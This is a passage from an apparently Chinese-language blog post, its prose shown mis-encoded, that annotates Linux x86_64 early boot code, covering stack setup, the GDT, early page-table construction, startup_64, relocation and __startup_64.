class="hljs-string">&quot; %0 &quot;</span> #val <span class="hljs-string">&quot;\&quot;&quot;</span> : : <span class="hljs-string">&quot;i&quot;</span> (val))</span><br><br>BLANK();<br>OFFSET(BP_scratch, boot_params, scratch);<br>OFFSET(BP_secure_boot, boot_params, secure_boot);<br>OFFSET(BP_loadflags, boot_params, hdr.loadflags);<br>OFFSET(BP_hardware_subarch, boot_params, hdr.hardware_subarch);<br>OFFSET(BP_version, boot_params, hdr.version);<br>OFFSET(BP_kernel_alignment, boot_params, hdr.kernel_alignment);<br>OFFSET(BP_init_size, boot_params, hdr.init_size);<br>OFFSET(BP_pref_address, boot_params, hdr.pref_address);<br>OFFSET(BP_code32_start, boot_params, hdr.code32_start);<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LOAD_PHYSICAL_ADDR ((CONFIG_PHYSICAL_START \</span><br><span class="hljs-meta">                + (CONFIG_PHYSICAL_ALIGN - 1)) \</span><br><span class="hljs-meta">                &amp; ~(CONFIG_PHYSICAL_ALIGN - 1))</span><br></code></pre></td></tr></table></figure><h2 id="å»ºç«‹æ ˆ"><a href="#å»ºç«‹æ ˆ" class="headerlink" title="å»ºç«‹æ ˆ"></a>å»ºç«‹æ ˆ</h2><p>å»ºç«‹æ ˆçš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movl$boot_stack_end, %eax<br>addl%ebp, %eax<br>movl%eax, %esp<br></code></pre></td></tr></table></figure><p>boot_stack_endçš„å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.bss<br>.balign 4<br>boot_heap:<br>.fill BOOT_HEAP_SIZE, 1, 0<br>boot_stack:<br>.fill BOOT_STACK_SIZE, 1, 0<br>boot_stack_end:<br></code></pre></td></tr></table></figure><ul><li>å°†boot_stack_endçš„é“¾æ¥åœ°å€æ”¾å…¥eax</li><li>åŠ ebpå¾—åˆ°boot_stack_endçš„å®é™…åœ°å€</li><li>æŠŠæ ˆç§»è¿‡å»</li></ul><h2 id="æ›´æ–°gdt"><a href="#æ›´æ–°gdt" class="headerlink" title="æ›´æ–°gdt"></a>æ›´æ–°gdt</h2><p>gdtçš„å®šä¹‰å¦‚ä¸‹ï¼š</p><ul><li>gdtå¤§å°ï¼š.word</li><li>gdtç‰©ç†åœ°å€ï¼š.long</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.data<br>gdt:<br>.wordgdt_end - gdt<br>.longgdt<br>.word0<br>.quad0x00cf9a000000ffff/* __KERNEL32_CS */<br>.quad0x00af9a000000ffff/* __KERNEL_CS */<br>.quad0x00cf92000000ffff/* __KERNEL_DS */<br>.quad0x0080890000000000/* TS descriptor */<br>.quad   0x0000000000000000/* TS continued */<br>gdt_end:<br></code></pre></td></tr></table></figure><p>æ›´æ–°gdtçš„è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">/* æ›´æ–°gdt */<br>addl%ebp, gdt+2(%ebp)<br>lgdtgdt(%ebp)<br></code></pre></td></tr></table></figure><ul><li>gdt+2çš„å†…å®¹+&#x3D;ç¨‹åºåŸºå€ï¼Œæ›´æ–°gdtç‰©ç†åœ°å€</li><li>æ›´æ–°lgdtå¯„å­˜å™¨ï¼ˆlgdtå¯„å­˜å™¨å†…å®¹ä¸ºgdtå¤§å°:gdtç‰©ç†åœ°å€ï¼‰</li></ul><h2 id="åˆæœŸé¡µè¡¨åˆå§‹åŒ–"><a href="#åˆæœŸé¡µè¡¨åˆå§‹åŒ–" class="headerlink" title="åˆæœŸé¡µè¡¨åˆå§‹åŒ–"></a>åˆæœŸé¡µè¡¨åˆå§‹åŒ–</h2><p>å»ºç«‹æ˜ å°„4Gå†…å­˜çš„é¡µè¡¨</p><p>Linuxå†…æ ¸ä½¿ç”¨4çº§é¡µè¡¨ï¼Œå»ºç«‹6ä¸ªé¡µè¡¨</p><ul><li>1ä¸ªPML4æˆ–ç§°ä¸º4çº§é¡µæ˜ å°„è¡¨ï¼ŒåŒ…å«1ä¸ªé¡¹</li><li>1ä¸ªPDPæˆ–ç§°ä¸ºé¡µç›®å½•æŒ‡é’ˆè¡¨ï¼ŒåŒ…å«4ä¸ªé¡¹</li><li>4ä¸ªé¡µç›®å½•è¡¨ï¼Œä¸€å…±åŒ…å«2048ä¸ªé¡¹ï¼Œä¸€é¡µ2MB</li></ul><p>å…ˆæ¸…ç†ä¸€å—å†…å­˜ï¼Œæ¯ä¸ªè¡¨éƒ½æ˜¯4096å­—èŠ‚ï¼Œæ‰€ä»¥éœ€è¦24KBå†…å­˜</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">lealpgtable(%ebx), %edi # ebxæ˜¯åŠ è½½çš„ç‰©ç†åœ°å€<br>xorl%eax, %eax<br>movl$(BOOT_INIT_PGT_SIZE/4), %ecx<br>repstosl<br></code></pre></td></tr></table></figure><p>pgtableçš„å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.section &quot;.pgtable&quot;,&quot;a&quot;,@nobits<br>.balign 4096<br>pgtable:<br>.fill BOOT_PGT_SIZE, 1, 0<br></code></pre></td></tr></table></figure><p>åˆ†é…ç©ºé—´åå…ˆå»ºç«‹PML4ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">/* Build Level 4 */<br>lealpgtable + 0(%ebx), %edi# edi=pgtable_addr<br>leal0x1007 (%edi), %eax# eax=edi+0x1007<br>movl%eax, 0(%edi)# [edi]=eax<br>addl%edx, 4(%edi)# [edi+4]+=edxï¼ˆä¹‹å‰å·²ç»æŠŠedxæ¸…é›¶äº†ï¼‰<br></code></pre></td></tr></table></figure><ul><li>&amp;PML4+0x1000æ˜¯PDPçš„åœ°å€</li><li>7æ˜¯é¡µè¡¨çš„æ ‡è®°ï¼Œè¡¨ç¤ºPRESENT+RW+USERä½†UNACCESSEDï¼ˆå¼€å¯åˆ†é¡µåè®¿é—®ä¸€æ¬¡å°±ä¼šå˜æˆACCESSEDï¼Œ0x27ï¼‰</li></ul><p>é¡µè¡¨æ ‡è®°å®šä¹‰å¦‚ä¸‹ï¼ˆç®€åŒ–è¿‡çš„ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _PAGE_PRESENT   0x001</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _PAGE_RW    0x002</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _PAGE_USER  0x004</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _PAGE_PWT   0x008</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _PAGE_PCD   0x010</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _PAGE_ACCESSED  0x020</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _PAGE_DIRTY 0x040</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _PAGE_PSE0x080</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _PAGE_GLOBAL0x100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _PAGE_SOFTW10x200</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _PAGE_SOFTW20x400</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _PAGE_PAT0x800</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _PAGE_PAT_LARGE 0x1000</span><br></code></pre></td></tr></table></figure><p>åˆå§‹åŒ–4ä¸ªPDPï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">/* Build Level 3 */<br>lealpgtable + 0x1000(%ebx), %edi# edi=pgtable_addr+0x1000ï¼ˆPDPåœ°å€ï¼‰<br>leal0x1007(%edi), %eax# eax=edi+0x1007<br>movl$4, %ecx# ecx=4<br>1:movl%eax, 0x00(%edi)# [edi]=eax<br>addl%edx, 0x04(%edi)# [edi+4]+=edx<br>addl$0x00001000, %eax# eax+=0x1000<br>addl$8, %edi# edi+=8<br>decl%ecx# ecx--<br>jnz1b<br></code></pre></td></tr></table></figure><p>åˆå§‹åŒ–4ä¸ªPDPçš„å…±2048ä¸ªé¡¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">/* Build Level 2 */<br>lealpgtable + 0x2000(%ebx), %edi# edi=pgtable_addr+0x2000ï¼ˆPDP[0]åœ°å€ï¼‰<br>movl$0x00000183, %eax# eax=0x183<br>movl$2048, %ecx# ecx=2048<br>1:movl%eax, 0(%edi)# eax=[edi]<br>addl%edx, 4(%edi)# [edi+4]+=edx<br>addl$0x00200000, %eax# eax+=0x200000<br>addl$8, %edi# edi+=8<br>decl%ecx# ecx--<br>jnz1b<br></code></pre></td></tr></table></figure><ul><li>0x183æ ‡è®°è¡¨ç¤º_PAGE_PRESENT+_PAGE_RW+_PAGE_PSE+_PAGE_GLOBAL</li><li>PSEè¡¨ç¤º2Mæˆ–4Mçš„é¡µ</li></ul><h1 id="startup-64"><a href="#startup-64" class="headerlink" title="startup_64"></a>startup_64</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.code64<br>.org 0x200<br>ENTRY(startup_64)<br><br>/* æ¸…ç©ºæ®µå¯„å­˜å™¨ */<br>xorl%eax, %eax<br>movl%eax, %ds<br>movl%eax, %es<br>movl%eax, %ss<br>movl%eax, %fs<br>movl%eax, %gs<br><br>/* è®¡ç®—å†…æ ¸ç¼–è¯‘æ—¶çš„ä½ç½®å’Œå®ƒè¢«åŠ è½½çš„ä½ç½®çš„å·®ï¼ˆå’Œstartup_32çš„æ­¥éª¤ç±»ä¼¼ï¼‰ */<br>#ifdef CONFIG_RELOCATABLE<br>leaqstartup_32(%rip), %rbp# rbp=startup_32_addr<br>movlBP_kernel_alignment(%rsi), %eax# eax=boot_params.hdr-&gt;kernel_alignment<br>decl%eax# eax--<br>addq%rax, %rbp# rbp+=rax<br>notq%rax# rax=~rax<br>andq%rax, %rbp# rbp&amp;=rax<br>cmpq$LOAD_PHYSICAL_ADDR, %rbp<br>jge1f<br>#endif<br>movq$LOAD_PHYSICAL_ADDR, %rbp<br>1:<br><br>movlBP_init_size(%rsi), %ebx# ebx=boot_params.hdr-&gt;init_size<br>subl$_end, %ebx# ebx-=_end<br>addq%rbp, %rbx# ebp+=eaxï¼ˆé‡å®šä½ç‰©ç†åœ°å€ï¼‰<br><br>/* æ ˆæŒ‡é’ˆçš„è®¾ç½®å’Œæ ‡å¿—å¯„å­˜å™¨çš„é‡ç½® */<br>leaqboot_stack_end(%rbx), %rsp<br><br>#ifdef CONFIG_X86_5LEVEL<br>/*<br> * æ£€æŸ¥æ˜¯å¦æ”¯æŒlevel5åˆ†é¡µ<br> */<br>pushq%rsi<br>calll5_paging_required<br>popq%rsi<br><br>/* If l5_paging_required() returned zero, we&#x27;re done here. */<br>cmpq$0, %rax<br>jelvl5<br><br>â€¦â€¦<br><br>lvl5:<br>#endif<br><br>/* æ¸…ç©ºæ ‡å¿—å¯„å­˜å™¨ */<br>pushq$0<br>popfq<br><br>/*<br> * å°†å‹ç¼©çš„å†…æ ¸å¤åˆ¶è¿‡å»ï¼Œè¿˜æœ‰relocatedä»£ç <br> */<br>pushq%rsi# ä¿å­˜rsiï¼Œå› ä¸ºrsiæ­¤æ—¶ä¿å­˜æŒ‡å‘boot_paramsçš„æŒ‡é’ˆ<br>leaq(_bss-8)(%rip), %rsi# rsi=_bss-8ç»å¯¹åœ°å€<br>leaq(_bss-8)(%rbx), %rdi# rdi=_bss-8é‡å®šä½åœ°å€<br>movq$_bss, %rcx# rcx=_bss<br>shrq$3, %rcx# rcx&gt;&gt;=3<br>std# å¤åˆ¶ä»é«˜åœ°å€åˆ°ä½åœ°å€è¿›è¡Œ<br>repmovsq# ä»rsiåˆ°rdiå¤åˆ¶æ•°æ®<br>cld<br>popq%rsi<br><br>/*<br> * è·³è‡³é‡å®šä½çš„relocated<br> */<br>leaqrelocated(%rbx), %rax<br>jmp*%rax<br></code></pre></td></tr></table></figure><h1 id="relocated"><a href="#relocated" class="headerlink" title="relocated"></a>relocated</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text<br>relocated:<br><br>/*<br> * æ¸…ç©ºbss<br> */<br>xorl%eax, %eax# eax=0<br>leaq    _bss(%rip), %rdi# rdi=_bss_addr<br>leaq    _ebss(%rip), %rcx# rcx=_ebss_addr<br>subq%rdi, %rcx# rcx-=rdi(rcx:size)<br>shrq$3, %rcx# rcx&gt;&gt;=3<br>repstosq<br><br>/*<br> * è°ƒæ•´GOT<br> */<br>leaq_got(%rip), %rdx# rdx=_got_addr<br>leaq_egot(%rip), %rcx# rcx=_egot_addr<br>1:<br>cmpq%rcx, %rdx<br>jae2f<br>addq%rbx, (%rdx)<br>addq$8, %rdx<br>jmp1b<br>2:<br><br>/*<br> * æå–å¹¶è·³è‡³å†…æ ¸ä»£ç <br> */<br>pushq%rsi/* ä¿å­˜boot_paramsæŒ‡é’ˆ */<br>movq%rsi, %rdi<br>leaqboot_heap(%rip), %rsi/* rsi=boot_heap_addr */<br>leaqinput_data(%rip), %rdx  /* rdx=input_data_addr */<br>movl$z_input_len, %ecx/* ecx=z_input_len */<br>movq%rbp, %r8/* r8=rbp */<br>movq$z_output_len, %r9/* r9=z_output_len */<br>callextract_kernel/* rax=kernel_addr */<br>popq%rsi<br><br>/*<br> * è·³è‡³å†…æ ¸ä»£ç <br> */<br>jmp*%rax<br></code></pre></td></tr></table></figure><h1 id="startup-64ï¼ˆé•¿æ¨¡å¼ï¼‰"><a href="#startup-64ï¼ˆé•¿æ¨¡å¼ï¼‰" class="headerlink" title="startup_64ï¼ˆé•¿æ¨¡å¼ï¼‰"></a>startup_64ï¼ˆé•¿æ¨¡å¼ï¼‰</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text<br>__HEAD<br>.code64<br>.globl startup_64<br>startup_64:<br>UNWIND_HINT_EMPTY<br><br>/* ä¸ºverify_cpuå»ºç«‹æ ˆ */<br>leaq(__end_init_task - SIZEOF_PTREGS)(%rip), %rsp<br><br>call verify_cpu<br><br>leaq_text(%rip), %rdi# rdi=_text_addr<br>pushq%rsi# ä¿å­˜rsiï¼Œrsi=&amp;boot_params<br>call__startup_64# è°ƒç”¨__startup_64<br>   # ä¼ å…¥å‚æ•°(rdi=&amp;_text,rsi=&amp;boot_params)<br>popq%rsi# æ¢å¤rsi<br><br>/* Form the CR3 value being sure to include the CR3 modifier */<br>addq$(early_top_pgt - __START_KERNEL_map), %rax<br>jmp 1f<br><br>â€¦â€¦<br><br>1:<br><br>/* æ‰“å¼€PAEå’ŒPGEï¼ˆcr4ï¼‰ */<br>movl$(X86_CR4_PAE | X86_CR4_PGE), %ecx<br>#ifdef CONFIG_X86_5LEVEL<br>orl$X86_CR4_LA57, %ecx<br>#endif<br>movq%rcx, %cr4<br><br>/* å°†early_top_pgtæ”¾å…¥cr3 */<br>addqphys_base(%rip), %rax<br>movq%rax, %cr3<br><br>/* ç¡®ä¿åœ¨ä½¿ç”¨è™šæ‹Ÿåœ°å€æ‰§è¡Œ */<br>movq$1f, %rax<br>jmp*%rax# è·³è‡³__startup_secondary_64çš„1<br></code></pre></td></tr></table></figure><p>å¼€å§‹ä½¿ç”¨è™šæ‹Ÿåœ°å€äº†ï¼Œç»“æŸ*â˜…,Â°*:.â˜†(ï¿£â–½ï¿£)&#x2F;$:*.Â°â˜…* ã€‚</p><h2 id="startup-64-1"><a href="#startup-64-1" class="headerlink" title="__startup_64"></a>__startup_64</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//ä½¿ç”¨çš„å®šä¹‰</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __START_KERNEL_map_AC(0xffffffff80000000, UL)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __START_KERNEL(__START_KERNEL_map + __PHYSICAL_START)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __PHYSICAL_STARTALIGN(CONFIG_PHYSICAL_START, \<span class="hljs-comment">// 0x1000000</span></span><br>      CONFIG_PHYSICAL_ALIGN)<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pgd_index(address) (((address) &gt;&gt; PGDIR_SHIFT) &amp; (PTRS_PER_PGD - 1))<span class="hljs-comment">//å–17-25ä½</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGDIR_SHIFT39</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTRS_PER_PGD512</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EARLY_DYNAMIC_PAGE_TABLES64                          </span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">pmd_t</span> early_dynamic_pgts[EARLY_DYNAMIC_PAGE_TABLES][PTRS_PER_PMD];<br><span class="hljs-type">static</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> __initdata next_early_pgt;<br><span class="hljs-type">pmdval_t</span> early_pmd_flags = __PAGE_KERNEL_LARGE &amp; ~(_PAGE_GLOBAL | _PAGE_NX);<br><br><span class="hljs-comment">//arch\x86\kernel\head64.c</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> __head __startup_64(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> physaddr,<br>  <span class="hljs-keyword">struct</span> boot_params *bp)<br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> load_delta, *p;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> pgtable_flags;<br><span class="hljs-type">pgdval_t</span> *pgd;<br><span class="hljs-type">p4dval_t</span> *p4d;<br><span class="hljs-type">pudval_t</span> *pud;<br><span class="hljs-type">pmdval_t</span> *pmd, pmd_entry;<br><span class="hljs-type">int</span> i;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *next_pgt_ptr;<br><br><span class="hljs-comment">/* æ£€æŸ¥ç‰©ç†åœ°å€æ˜¯å¦è¿‡å¤§ */</span><br><span class="hljs-keyword">if</span> (physaddr &gt;&gt; MAX_PHYSMEM_BITS)<br><span class="hljs-keyword">for</span> (;;);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è®¡ç®—ç‰©ç†åœ°å€å’Œç¼–è¯‘åœ°å€ä¹‹é—´çš„å·®å€¼</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * _textçš„é»˜è®¤è™šæ‹Ÿåœ°å€æ˜¯0xffffffff81000000ï¼Œ__START_KERNEL_map=0xffffffff80000000</span><br><span class="hljs-comment"> * _text-__START_KERNEL_mapå°±æ˜¯_textçš„ç›¸å¯¹åœ°å€</span><br><span class="hljs-comment"> * load_daltaå°±æ˜¯å®é™…åŠ è½½åŸºå€</span><br><span class="hljs-comment"> */</span><br>load_delta = physaddr - (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(_text - __START_KERNEL_map);<br><br><span class="hljs-comment">/* åˆ¤æ–­æ˜¯å¦2Må¯¹é½ */</span><br><span class="hljs-keyword">if</span> (load_delta &amp; ~PMD_PAGE_MASK)<br><span class="hljs-keyword">for</span> (;;);<br><br><span class="hljs-comment">/* å¦‚æœæ”¯æŒSMEåˆ™å¼€å¯ */</span><br>sme_enable(bp);<br><br><span class="hljs-comment">/* Include the SME encryption mask in the fixup value */</span><br>load_delta += sme_get_me_mask();<br><br><span class="hljs-comment">/* ä¿®æ­£å…¨å±€é¡µç›®å½•åœ°å€ï¼Œå¹¶å°†ä½¿ç”¨è¡¨é¡¹+å®é™…åŠ è½½åŸºå€ */</span><br><br>pgd = fixup_pointer(&amp;early_top_pgt, physaddr);<br>pgd[pgd_index(__START_KERNEL_map)] += load_delta;<br><br>    <span class="hljs-comment">/* å¦‚æœå¼€å¯5çº§é¡µè¡¨ */</span><br><span class="hljs-keyword">if</span> (IS_ENABLED(CONFIG_X86_5LEVEL)) &#123;<br>p4d = fixup_pointer(&amp;level4_kernel_pgt, physaddr);<br>p4d[<span class="hljs-number">511</span>] += load_delta;<br>&#125;<br>                          <br><span class="hljs-comment">/* ä¿®æ­£ä¸Šå±‚é¡µç›®å½•åœ°å€ï¼Œå¹¶å°†ä½¿ç”¨è¡¨é¡¹+å®é™…åŠ è½½åŸºå€ */</span><br>pud = fixup_pointer(&amp;level3_kernel_pgt, physaddr);<br>pud[<span class="hljs-number">510</span>] += load_delta;<br>pud[<span class="hljs-number">511</span>] += load_delta;<br><br>    <span class="hljs-comment">/* ä¿®æ­£ä¸­é—´é¡µç›®å½•åœ°å€ï¼Œå¹¶å°†ä½¿ç”¨è¡¨é¡¹+å®é™…åŠ è½½åŸºå€ */</span><br>pmd = fixup_pointer(level2_fixmap_pgt, physaddr);<br>pmd[<span class="hljs-number">506</span>] += load_delta;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æŠŠç°åœ¨ä½¿ç”¨çš„ç‰©ç†åœ°å€è¿›è¡Œæ˜ å°„ï¼Œä¸ºäº†åœ¨ä½¿ç”¨è™šæ‹Ÿåœ°å€ä¹‹å‰è¿˜èƒ½æ­£å¸¸è®¿é—®æ‰§è¡Œ</span><br><span class="hljs-comment"> * 